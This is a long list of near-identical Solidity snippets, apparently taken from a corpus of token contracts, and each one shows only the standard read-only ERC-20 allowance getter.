<source file="systems/source-code/0x827f6ADc76821927E8f43ECA46eEC57d4338A421.sol" startline="143" endline="145" pcid="4901">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xAd222E0eD7193b73694bC09FE40e285F7BADe1F9.sol" startline="75" endline="77" pcid="6266">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xBf2A2Cb09E5d0714977A57C3f1e95a8682233099.sol" startline="79" endline="81" pcid="6842">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xa23e76262e6617dab8caadd452d0f428201267e1.sol" startline="84" endline="86" pcid="5851">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3c44f3b816Dac7abDe925fDBB52448b9aB23f623.sol" startline="75" endline="77" pcid="2112">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xF0098c03f5544FcC13F8f4DeB183527801B6B40D.sol" startline="78" endline="80" pcid="8799">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x681cc758d8f73Aee9cA926845b46FAc425a9f131.sol" startline="79" endline="81" pcid="3871">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x0D6a0b9A0989D9126953C5a4aE4aA5300f6535f1.sol" startline="75" endline="77" pcid="362">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xdd160949e087Ef040BbFde43E454BA45dF2E8B52.sol" startline="80" endline="82" pcid="7862">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x550f95a80e42c5cfBc786C5C47322862e0332528.sol" startline="78" endline="80" pcid="3180">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xdBE642963F5e8dF51Ccc6924B2bEfa8930149721.sol" startline="79" endline="81" pcid="7806">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xf1d00aE9Bb8D5369786FD83A0103866071C59cA4.sol" startline="76" endline="78" pcid="8836">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xD779eC84BC7681f2d2c51799bCF0A362b5130044.sol" startline="76" endline="78" pcid="7700">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xFc9804E65cC6E47964c809b9f704440DFb8C5eA0.sol" startline="75" endline="77" pcid="9209">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x584535e0ce218addde8af49c308F25aAb7033E53.sol" startline="77" endline="79" pcid="3311">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x527B878E22Db9747eeA5d5d5e6A241BB42634C5E.sol" startline="78" endline="80" pcid="3075">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x5775071e01A9A3FC99484b55dF24541AFccDDe5C.sol" startline="76" endline="78" pcid="3290">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3c9176ca5edd24a65e938e37729e717a3776ed06.sol" startline="74" endline="76" pcid="2149">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xf84335126a90025bd4eb3dd43a1aa6a906d6739b.sol" startline="38" endline="40" pcid="9032">
    function allowance(address owner, address spender) public view returns (uint256) {
        return z[owner][spender];
    }
</source>
<source file="systems/source-code/0x73095365CF296E26D912E095C38FAc6b3fFAD3AF.sol" startline="79" endline="81" pcid="4227">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x80a2f100cb796a142faca9f6ffc31dabb0b0663f.sol" startline="77" endline="79" pcid="4795">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x49D141A0B0190d120039F603F434F51a39f33D6c.sol" startline="77" endline="79" pcid="2787">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xC44c92c0226cF68852E3dbD8E5020B654781De95.sol" startline="72" endline="74" pcid="7054">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xa5bf4225edeFe7bdA05825b60D5497e2a5445F1e.sol" startline="76" endline="78" pcid="6037">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x4c143f140ee6C2E0c0f6125b3133DC67C9D95856.sol" startline="78" endline="80" pcid="2854">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x4C3c01Be6fb38419cE6b1F6782d751c5bE6D7751.sol" startline="77" endline="79" pcid="2869">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xCDFcbB5be93d37A33C85ffd7828dDDd332823349.sol" startline="75" endline="77" pcid="7313">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x4c9AE7Cbc12242F162DdeAab10B57Fff01AF836d.sol" startline="76" endline="78" pcid="2884">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x22E7f1B1300DBd955C689ac4Da292f938A4AEBFA.sol" startline="77" endline="79" pcid="1052">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x22348b2351817d12C0a89c35AF96B919544D7398.sol" startline="76" endline="78" pcid="1037">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x019A98258bd5dE47900a0be227087af81Eaf4c69.sol" startline="81" endline="83" pcid="53">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x8Dfec76a1104A22faAD1c7Ba7A90d9508e3eF5a7.sol" startline="75" endline="77" pcid="5203">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x76F7c76B8bcb64CEBcDCd6eE7D9eA3F4A4203CF8.sol" startline="81" endline="83" pcid="4478">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x690C351f059c4963362cB75AAb802A2b95bA2B0C.sol" startline="75" endline="77" pcid="3907">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x492615CB4660943C014ee5950b9375912fF683B8.sol" startline="76" endline="78" pcid="2752">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xeE35812e1254Da3Bd81eA1ba4275f2001085d671.sol" startline="75" endline="77" pcid="8694">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x2f324d85C72E2d25bEA80f1aF03392825e15E49a.sol" startline="73" endline="75" pcid="1432">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xc17DC80eF016E918587Ea3ffb55894a8515519C1.sol" startline="76" endline="78" pcid="6942">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xefF6ee6e86feF5f6b61560a3c99e7DCFf53f7bb6.sol" startline="75" endline="77" pcid="8784">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x6FEDf988195cD0906d8A62D0D55D35cd35D8ef1b.sol" startline="695" endline="697" pcid="4094">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xe928e115184bad954b11c477df5e1fc94f04e45d.sol" startline="77" endline="79" pcid="8426">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x1cFdab1D6685C85C299503BD1d3C6bab5e5933a1.sol" startline="125" endline="127" pcid="918">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xf86c25675cd74be058a798894008ecf6a67dca21.sol" startline="78" endline="80" pcid="9045">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x938f386ac6101Dd112e656EdDc27C8bF32c85165.sol" startline="76" endline="78" pcid="5375">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x1553F94Cc349AaCa6c1f70707740e48d14f2632D.sol" startline="44" endline="46" pcid="606">
    function allowance(address owner, address spender) public view returns (uint256) {
        return z[owner][spender];
    }
</source>
<source file="systems/source-code/0xCf60d61616a64371DF34580AcE2b13401d29C55c.sol" startline="79" endline="81" pcid="7385">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x54D5cc9Ff426EFC848796Bd739c95BCF1Cc82447.sol" startline="148" endline="150" pcid="3162">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3D4c18a96cf765104e6d70aAA8B11a26eD0e1b40.sol" startline="695" endline="697" pcid="2216">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xfE0A4D6A16F934E3d595DB4b0D893071124CB693.sol" startline="74" endline="76" pcid="9294">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x1b7B0b213fB6B96fCFB754881175bb4422e39b52.sol" startline="79" endline="81" pcid="876">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xa42284f1617bc85bd6c0139f9482b0908ee42915.sol" startline="77" endline="79" pcid="5963">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xc601f3c40a8DE1f872AE056e7e21E255E740741A.sol" startline="50" endline="52" pcid="7114">
  function allowance(address player, address spender) public view returns (uint256) {
    return allowed[player][spender];
  }
</source>
<source file="systems/source-code/0x19a64f43113e925223a9d76513727044e5160e70.sol" startline="59" endline="61" pcid="788">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x46e743046dccf9ab65b8454cdf879187aab5dd49.sol" startline="80" endline="82" pcid="2660">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x24EdaAAdB4EA4C7aa6CAe4dBB0D0a93C8F5FF180.sol" startline="75" endline="77" pcid="1148">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3dA0eD9Ba67D1EC0CF5fDeE7598B544BD8A1fA38.sol" startline="80" endline="82" pcid="2250">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xcd8bdb2857ea0948122ccb9b17fc2a6d721b97ae.sol" startline="77" endline="79" pcid="7298">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x6Bf6EE9e148031D538521BB8Ed8658C6Fe12391a.sol" startline="77" endline="79" pcid="3973">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x398Fa4bd97036EB7cF85E84FbDe34959b4E4C396.sol" startline="79" endline="81" pcid="1916">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xad412ae15b025e6a5a583c66a42d25e10d53cda6.sol" startline="55" endline="57" pcid="6291">
    function allowance(address owner, address spender) public view returns (uint256) {
        return allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x73D5168CeB5a4cE0d3f74a01A92e05305339DD61.sol" startline="80" endline="82" pcid="4242">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3B06f6027a41bfCED3D5e6855B69aeA5e7426e90.sol" startline="78" endline="80" pcid="2018">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x1f3adE6D938122006C0Dc9fb893d767080123917.sol" startline="72" endline="74" pcid="977">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x7E6d55c8dF6E82AfbC76620561cFB99196aC090c.sol" startline="76" endline="78" pcid="4693">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x7e1bcb000d4c5ced0a5eabe44c871b5206213a4f.sol" startline="79" endline="81" pcid="4677">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xF8cde3CAf78d43cF6e15181858c0923027B24cDd.sol" startline="76" endline="78" pcid="9060">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xb3F23B54930Fa83b12A26eD228E431C4A6187590.sol" startline="79" endline="81" pcid="6568">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x5f4B753ddeb0Bc2f78D4bE446994BF0C0497D98e.sol" startline="79" endline="81" pcid="3599">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xc9e2d2a161445b4602d1908dae1a4ad90e3f1b49.sol" startline="78" endline="80" pcid="7191">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="453" endline="455" pcid="7021">
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }
</source>
<source file="systems/source-code/0xA55a6E9BFC3Ba7cb2421146B8F111919bCfB0060.sol" startline="75" endline="77" pcid="6022">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xfd0d43a6f56f17d6efe203410a9306a7953885e5.sol" startline="58" endline="60" pcid="9219">
    function allowance(address owner, address spender) public view returns (uint256) {
        return allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xe33c37cddb31548856537434d103e57d99242efb.sol" startline="78" endline="80" pcid="8216">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xaE940311F8bBFFfc2B198fFf5019b80b02a4F421.sol" startline="74" endline="76" pcid="6351">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xb829eD47639af08DD4Bc781c8dCeEE4C3e4a32f7.sol" startline="76" endline="78" pcid="6687">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x400ceeaef948d1DfE5fD1F2fa5a431Fb7e11a086.sol" startline="75" endline="77" pcid="2346">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xd77c9d684B9e00b9Fc45F929d3DE8514DEEd0Cff.sol" startline="79" endline="81" pcid="7715">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x707dAb814AAE29c506EAfc8036b64066FC403444.sol" startline="75" endline="77" pcid="4135">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x8fE05D10B3c7aE008165Db5FA6a472c25E666A7F.sol" startline="78" endline="80" pcid="5269">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x7b43aee5ca91412d54b6ee6b35a1708063e210f1.sol" startline="58" endline="60" pcid="4620">
    function allowance(address owner, address spender) public view returns (uint256) {
        return allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x07d02e6806fe51ba3488ba0536589cdbd393ff15.sol" startline="1513" endline="1515" pcid="201">
    function allowance(address owner, address spender) public view returns (uint256) {
        return z[owner][spender];
    }
</source>
<source file="systems/source-code/0x77b3e393d8BC4ee7a6d0afff7eDeE5c449E61852.sol" startline="77" endline="79" pcid="4493">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xc05CA5129c0D91f039B22C3f47FD82077adA63f6.sol" startline="76" endline="78" pcid="6871">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xB656d138e4C030064A7aA8d83Aa929928A730c10.sol" startline="79" endline="81" pcid="6645">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xA84aFAFf03113A740F0572E617d5972654F0dA4F.sol" startline="77" endline="79" pcid="6152">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x02ab29a17d2a8446af2559ff31bdee27ae3dd944.sol" startline="39" endline="44" pcid="106">
    function allowance(
        address account,
        address spender
    ) public view returns (uint256) {
        return _allowances[account][spender];
    }
</source>
<source file="systems/source-code/0x75d5d49F80871F23bEE1448070790A77C56d3d00.sol" startline="73" endline="75" pcid="4365">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xE29128019902c7B59CEb2A145D7FBFdA58b0ab02.sol" startline="82" endline="84" pcid="8170">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x7564011A8636815Db93dE33ceD4a65Ea0A8CF337.sol" startline="76" endline="78" pcid="4319">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x9c03094376D96C2b5ffd1B1C5129b048438700CF.sol" startline="74" endline="76" pcid="5676">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xfEf911f4AbE542804fdDFD538E637c827a2c4295.sol" startline="78" endline="80" pcid="9333">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3943a56c7b1efd43c3c952aec05cb295f0ab8c67.sol" startline="73" endline="75" pcid="1901">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x821d158c454B3a3Fcef1B9f35DBa9cb0e37C5453.sol" startline="78" endline="80" pcid="4859">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xefbd223978ababc08414ff766cf04028daa5266a.sol" startline="84" endline="86" pcid="8769">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xfd1e0ec0d64d806d833b80b8cbd01dfdc9062c3d.sol" startline="79" endline="81" pcid="9231">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x140682C8B95deC6Bd012303aFc86ca1D55C74E36.sol" startline="82" endline="84" pcid="565">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x0D33f227b588446F1Bff2b07AE00fF69EB086876.sol" startline="79" endline="81" pcid="347">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xE363D20dfC0e68fb1da7669216826010275aE6dc.sol" startline="75" endline="77" pcid="8246">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x6d1456049210842b851a60C4ca116179658eF07a.sol" startline="77" endline="79" pcid="4018">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xA8752c38CaA247fC7724A2D8d4f04e2eD410d7AC.sol" startline="78" endline="80" pcid="6167">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xea53c94ea7862c92d0f084d24551fe4f23beb463.sol" startline="75" endline="77" pcid="8486">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x585E00E541d4e331A7574248beC368420BBaDdf1.sol" startline="75" endline="77" pcid="3326">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x2965DC16e5d7525240AFDac5315214170C1dBe26.sol" startline="76" endline="78" pcid="1261">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x402b213C2Fbc27fBf8E127AD40Fad371dDac94a5.sol" startline="76" endline="78" pcid="2361">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x8d1Ac863255DFA88B9028eC119f12ABC1062b767.sol" startline="76" endline="78" pcid="5173">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x847d2f49E856550F93f7aADF444528a024256372.sol" startline="79" endline="81" pcid="4949">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x08CA60267661ce86730fc825Be00385d8635B94B.sol" startline="78" endline="80" pcid="229">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x5d3feb9feedf8e6bbf8dd1b8c3be081b11cb687f.sol" startline="23" endline="25" pcid="3538">
    function allowance(address owner, address spender) public view returns (uint256) {
        return z[owner][spender];
    }
</source>
<source file="systems/source-code/0x5ABbDae4e6d7c89640129E87409C8F991CeE5174.sol" startline="79" endline="81" pcid="3443">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xc41c02cd4009b81815af285ab87e4ac171b1e4d2.sol" startline="78" endline="80" pcid="7039">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xb6a9c0b053c8837e2616fc5aaff1886d03fd7065.sol" startline="35" endline="37" pcid="6654">
    function allowance(address owner, address spender) public view returns (uint256) {
        return a[owner][spender];
    }
</source>
<source file="systems/source-code/0xd4738e9EE70F7C409c5704A8243E2Cf75162098f.sol" startline="79" endline="81" pcid="7578">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x99D00D99221a9CFF03d0F48a6674b71A7d0893Fc.sol" startline="71" endline="73" pcid="5593">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x1bF767eC706587F6b3c3f475c8d76692cA19F14b.sol" startline="74" endline="76" pcid="898">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xef037B58e38300652e9D341D22DB7979Ef33AD6B.sol" startline="80" endline="82" pcid="8709">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x21bcc45a9a9cb57084b6d6409d8fb0717bffeb91.sol" startline="75" endline="77" pcid="1022">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x029D614F344A2a6edE1de8ef4793a3369De927d4.sol" startline="75" endline="77" pcid="98">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x47BCDA0202Cf59825388c1Fbc6A03B52dd068121.sol" startline="79" endline="81" pcid="2705">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x887503fb56fDD4b0C97dD5ad5f01EACc4847E682.sol" startline="77" endline="79" pcid="5049">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xefb888BC43e9BC7cA5312fBae0CD394Cf1A27af6.sol" startline="79" endline="81" pcid="8754">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xA2F5f226ab0cC49602dFf5e178AC9bC978869395.sol" startline="75" endline="77" pcid="5866">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x957611a96e326c3b8aEa24B545Cd84bA72Ff0A9d.sol" startline="76" endline="78" pcid="5420">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x532b9b8cDdE8fDF33e41bF2aE578fC83D9CF8AC9.sol" startline="79" endline="81" pcid="3090">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x5fae3af584495c5c2cbaa83740e55037a6633368.sol" startline="36" endline="38" pcid="3631">
    function allowance(address owner, address spender) public view returns (uint256) {
        return a[owner][spender];
    }
</source>
<source file="systems/source-code/0x4D8c3df04Ce9B909c9FBF4347A5a3fFAdf190142.sol" startline="79" endline="81" pcid="2914">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xd1a932685B4e94E152589C0f264a851812f25724.sol" startline="77" endline="79" pcid="7459">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xe0284b1a69321af02b565365Eae1a7Be844C94DB.sol" startline="74" endline="76" pcid="8036">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x8760079142f48028f4e06656565667d2b66a040f.sol" startline="76" endline="78" pcid="5019">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x613D596e4500c1538214bf023e3151DaA7555E97.sol" startline="73" endline="75" pcid="3729">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xBA2037B5dB212a0Ff8326af9Cb3cC3d906B15Dd8.sol" startline="149" endline="151" pcid="6731">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x10682fF02FC98F7FB6ceA08e7a584262DB51a399.sol" startline="77" endline="79" pcid="435">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xfBB3b5DF228ded41b9450C535Cd115707c6456C1.sol" startline="75" endline="77" pcid="9179">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xE93B81908F25a136AEC81715E3673274d46D5b62.sol" startline="79" endline="81" pcid="8441">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x33F474718b13546c5A717Ff1Fbd2d8BcaB6Fdd45.sol" startline="77" endline="79" pcid="1598">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x1F4275D2806f24d44a0f047C9591141409533f8d.sol" startline="80" endline="82" pcid="992">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x261771ae5888e4cc4f84eb74d9b2c931523272e9.sol" startline="594" endline="596" pcid="1209">
    function allowance(address owner, address spender) public view returns (uint256) {
        return z[owner][spender];
    }
</source>
<source file="systems/source-code/0x42549293c0df3d2eb5ef99722aab9b7228f885a3.sol" startline="77" endline="79" pcid="2451">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xf34839a7431d6c70673f3a3bcfb589c042fd219d.sol" startline="72" endline="74" pcid="8853">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3aE19CA727e6c9C06dA578fB34113aF9aC0676ee.sol" startline="79" endline="81" pcid="2003">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
